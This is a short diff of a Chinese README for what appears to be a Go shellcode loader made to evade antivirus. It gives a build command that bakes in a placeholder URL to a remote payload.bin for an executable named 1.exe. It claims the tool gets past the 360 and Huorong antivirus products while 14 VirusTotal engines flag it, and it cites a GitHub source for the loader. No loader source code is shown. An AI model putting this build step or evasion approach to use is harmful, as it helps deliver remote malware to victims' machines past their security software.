@@ -5,6 +5,8 @@
 
 2、编译：go build -ldflags "-s -w -X main.url=http://xx.xx.xx.xx/payload.bin" -o 1.exe -race shellcode.go
 
-3、虽然VT查杀还是有14，但是截止到目前为止，360与火绒都能过
+3、VT查杀14，但是截止到目前为止，360与火绒都能bypass
 
-本人刚开始学习免杀，还很菜，此源码参考了https://github.com/fcre1938/goShellCodeByPassVT/blob/main/main.go,欢迎大佬提出建议
+本人刚开始学习免杀，还很菜，此源码参考了https://github.com/fcre1938/goShellCodeByPassVT/blob/main/main.go
+
+欢迎大佬提出建议
